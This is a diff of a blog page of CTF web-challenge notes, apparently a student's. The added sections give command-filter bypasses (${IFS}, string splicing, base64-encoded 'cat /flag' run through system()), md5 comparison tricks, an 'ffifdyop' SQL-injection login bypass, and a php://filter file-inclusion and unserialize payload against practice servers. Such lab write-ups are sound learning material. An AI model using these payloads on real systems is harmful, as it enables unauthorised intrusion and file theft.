@@ -261,7 +261,7 @@
 
 	<a href="/2024/03/18/web/" itemprop="url">
 		<time datetime="2024-03-18T00:56:35.147Z" itemprop="dateUpdated">
-	  		2024-04-12
+	  		2024-04-13
 	  </time>
 	</a> 
 
@@ -280,52 +280,6 @@
 
 		<div class="article-content" id="article-content">
 			<hr>
-<!-- toc -->
-
-<ul>
-<li><a href="#php_unserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP_UNSERIALIZE(反序列化)</a><ul>
-<li><a href="#%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6">触发条件</a></li>
-<li><a href="#php_unserialize-2">PHP_UNSERIALIZE ( 2 )</a></li>
-</ul>
-</li>
-<li><a href="#sql%E6%B3%A8%E5%85%A5">SQL注入</a></li>
-<li><a href="#http">HTTP</a><ul>
-<li><a href="#referer">referer</a></li>
-</ul>
-</li>
-<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a></li>
-<li><a href="#%E6%AD%A3%E5%88%99">正则</a><ul>
-<li><a href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6">特殊字符</a></li>
-</ul>
-</li>
-<li><a href="#md5">md5</a><ul>
-<li><a href="#%E5%80%BC%E7%BB%95%E8%BF%87">值绕过</a></li>
-<li><a href="#%E6%96%87%E4%BB%B6md5">文件MD5</a></li>
-</ul>
-</li>
-<li><a href="#%E9%A2%98%E7%9B%AE">题目</a><ul>
-<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a></li>
-<li><a href="#http">http</a></li>
-<li><a href="#rce-%E7%A6%81%E6%AD%A2%E7%AC%A6%E7%BB%95%E8%BF%87">rce 禁止符绕过</a><ul>
-<li><a href="#catifsf">cat${IFS}&#x2F;f*</a></li>
-</ul>
-</li>
-<li><a href="#%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5">菜刀连接</a><ul>
-<li><a href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bcaidao">[SWPUCTF 2021 新生赛]caidao</a></li>
-</ul>
-</li>
-<li><a href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE">伪协议</a><ul>
-<li><a href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96">伪协议读取</a></li>
-</ul>
-</li>
-<li><a href="#rce">rce</a></li>
-<li><a href="#rce-1">rce</a></li>
-<li><a href="#%E6%B8%B8%E6%88%8F%E9%A2%98">游戏题</a></li>
-</ul>
-</li>
-</ul>
-<!-- tocstop -->
-
 <h1><span id="php_unserialize反序列化">PHP_UNSERIALIZE(反序列化)</span></h1><h2><span id="触发条件">触发条件</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">construct</span><br><span class="line">tostring</span><br></pre></td></tr></table></figure>
 
 <h2><span id="php_unserialize-2">PHP_UNSERIALIZE ( 2 )</span></h2><p><a href="https://ctf.a1natas.com/games/10/challenges">🤩敲门砖-带你入门 CTF - A1::CTF (a1natas.com)</a></p>
@@ -370,7 +324,15 @@
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:12287/LLeeevvveeelll222.php?a=//e&amp;b=system(&quot;cat /flag&quot;);&amp;c=</span></span><br><span class="line">http:<span class="comment">//localhost:12287/LLeeevvveeelll222.php?a=//e&amp;b=phpinfo()&amp;c=</span></span><br></pre></td></tr></table></figure>
 
-<h1><span id="题目">题目</span></h1><h2><span id="反序列化">反序列化</span></h2><p>[SWPUCTF 2021 新生赛]ez_unserialize</p>
+<h1><span id="绕过">绕过</span></h1><h4><span id="md5绕过">md5绕过</span></h4><h5><span id="弱等于x3dx3d">弱等于(&#x3D;&#x3D;)</span></h5><p>可用特殊值绕过</p>
+<h5><span id="强等于x3dx3dx3d">强等于(&#x3D;&#x3D;&#x3D;)</span></h5><p>用数组绕过</p>
+<h4><span id="禁止符绕过">禁止符绕过</span></h4><h5><span id="20">%20</span></h5><p>${IFS}代替</p>
+<h5><span id="一般禁止cat-flag">一般禁止(cat flag)</span></h5><p>用\绕过</p>
+<h5><span id="通过字符拼接绕过">通过字符拼接绕过</span></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="variable">$a</span>=<span class="string">&#x27;ca&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;t&#x27;</span>;<span class="variable">$c</span>=<span class="string">&#x27;&lt;&gt;/fl&#x27;</span>;<span class="variable">$d</span>=<span class="string">&#x27;ag&#x27;</span>;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$c</span>.<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure>
+
+<h5><span id="通过base64绕过">通过base64绕过</span></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">base64_decode</span>(Y2F0IC9mbGFn));</span><br></pre></td></tr></table></figure>
+
+<h1><span id="题目">题目</span></h1><h2><span id="没有题目反序列化">没有题目;反序列化</span></h2><p>[SWPUCTF 2021 新生赛]ez_unserialize</p>
 <p>没有题目试试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28724/robots.txt</span><br></pre></td></tr></table></figure>
 
@@ -426,6 +388,62 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">找到game.js</span><br><span class="line">http://node4.anna.nssctf.cn:28061/src/game.js</span><br><span class="line"></span><br><span class="line">        FINISH: &#123;</span><br><span class="line">            title: function () &#123;return &#x27;LEVEL COMPLETED&#x27;;&#125;,</span><br><span class="line">            text:  function () &#123;if (mLevel === 6) &#123;return &#x27;GOT F|L|A|G &#123;y0u_w1n_th1s_!!!&#125;&#x27;;&#125; else &#123;return &#x27;CLICK TO CONTINUE&#x27;;&#125;&#125;,</span><br><span class="line">        &#125;</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>
 
+<h2><span id="没有题目网页跳转">没有题目;网页跳转</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28279/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28279/secret.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">用burpsuit抓包访问</span><br><span class="line"></span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Date: Sat, 13 Apr 2024 07:00:53 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">nctf2018: flag&#123;w3lc0m3_t0_nctf2018hhhhhhhhhhhh&#125;</span><br><span class="line">location: ./secret.php</span><br><span class="line">Content-Length: 22</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">flag&#123;this_is_not_flag&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="sql注入">sql注入 **</span></h2><p>猜测sql语句:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_post[&#x27;query&#x27;] || flag from flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
+
+<h2><span id="get-file绕过文件包含反序列化">get file;绕过;文件包含;反序列化 **</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28899/?text=data://text/plain,welcome to the zjctf</span><br><span class="line">&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+
+<p>解码后得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28899/?text=data://text/plain,welcome to the zjctf</span><br><span class="line">&amp;file=useless.php</span><br><span class="line">&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看得到源代码flag</p>
+<h2><span id="没有题目sql注入">没有题目;sql注入**</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在f12里查看响应头</span><br><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> 果然是sql注入，</span><br><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br><span class="line"></span><br><span class="line">这里面password就是我们用户框中输入得东西。如果通过md5之后返回字符串是&#x27;or 1的话，形成一个永真条件，</span><br><span class="line"></span><br><span class="line">select * from &#x27;admin&#x27; where password=&#x27;  &#x27;or  &#x27;6...&#x27;</span><br><span class="line"></span><br><span class="line">看了大佬博客，这个可以用ffifdyop绕过，绕过原理是：</span><br><span class="line">ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 &#x27; or &#x27;6</span><br><span class="line">而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from &#x27;admin&#x27; where password=&#x27;&#x27; or &#x27;6xxxxx&#x27;，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</span><br><span class="line">果然，我们提交之后就绕过了这个，来到了另一个页面</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    header(&#x27;Location: levell14.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO-----------0E830400451993494058024219903391</span><br><span class="line">240610708---------0E462097431906509019562988736854</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO和s878926199a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post传参:</span><br><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>
+
+<h2><span id="getpost传参">get;post传参</span></h2><p>注意大小写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:28938/?CTF=Lit2023</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">Challenge=i&#x27;m_c0m1ng</span><br></pre></td></tr></table></figure>
+
+<h2><span id="游戏题">游戏题</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看源码</span><br><span class="line"></span><br><span class="line">http://node5.anna.nssctf.cn:28586/js/preload.js</span><br></pre></td></tr></table></figure>
+
+<h2><span id="jpg图片md5">jpg图片md5</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">参考链接:</span><br><span class="line">https://natmchugh.blogspot.com/2014/10/how-i-created-two-images-with-same-md5.html</span><br><span class="line">https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html</span><br><span class="line">https://www.jianshu.com/p/c9089fd5b1ba</span><br><span class="line">https://0clickjacking0.github.io/2020/08/24/CTF%E4%B8%AD%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</span><br><span class="line">http://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html</span><br></pre></td></tr></table></figure>
+
+<p><a href="D:\10_yzzob_web_again\source\img\barry.jpg">1</a><br><a href="D:\10_yzzob_web_again\source\img\james.jpg" ">2</a></p>
+<p>两个md5值相同amz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asdqwe</span><br></pre></td></tr></table></figure>
+
 	
 		</div>
 		
@@ -467,6 +485,38 @@
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/14/Reverse/" title="Reverse">
+								Reverse			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 14日, 2024				
+							</p>
+							<p class="relate-post-content">
+								12n:改名h:16j
+
+界面介绍
+伪代码窗口
+汇编窗口
+代码流窗口
+不同窗体间的转换12代码流窗口与汇编窗口 通过space切换ctrl+1 选择Disassembly即可打开代码流窗口或汇编窗口 
+
+
+
+Tea(Tiny Encr...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/14/Reverse/" title="Reverse">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="Reverse"/>
+							</a>
+						</div>
+					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -572,8 +622,14 @@
 								四月 1日, 2024				
 							</p>
 							<p class="relate-post-content">
-								1.题目分类2.所给内容MISC条形码
-1234567891011121314151617181920212223242526272829303132333435363738from PIL import Imagedef proce...
+								1.题目分类2.所给内容MISC损坏的文件2.来自提瓦特的神秘文件.zip
+用010editor打开
+不全zip头:504B0304
+解压缩是奇怪的文字图片,
+根据题目可以翻译的到flag
+也可以保存下来用百度等浏览器扫扫看
+条形码
+...
 							</p>
 						</div>
 
@@ -679,28 +735,6 @@ VM？VM！1
 							<a href="/2024/03/24/draft/" title="draft">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="draft"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/03/19/%E5%A4%A7%E4%BA%8C%E4%B8%8B/" title="大二下">
-								大二下			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								三月 19日, 2024				
-							</p>
-							<p class="relate-post-content">
-								C#(软件项目实训)c#的基本架构在C#中，通常使用一种称为”三层架构”或”三层架构模式”的设计模式来组织代码。这种模式将应用程序分为三个主要部分：业务逻辑层（BLL），数据访问层（DAL），和用户界面层（通常是UI层或Present...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/03/19/%E5%A4%A7%E4%BA%8C%E4%B8%8B/" title="大二下">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="大二下"/>
 							</a>
 						</div>
 					</li>												
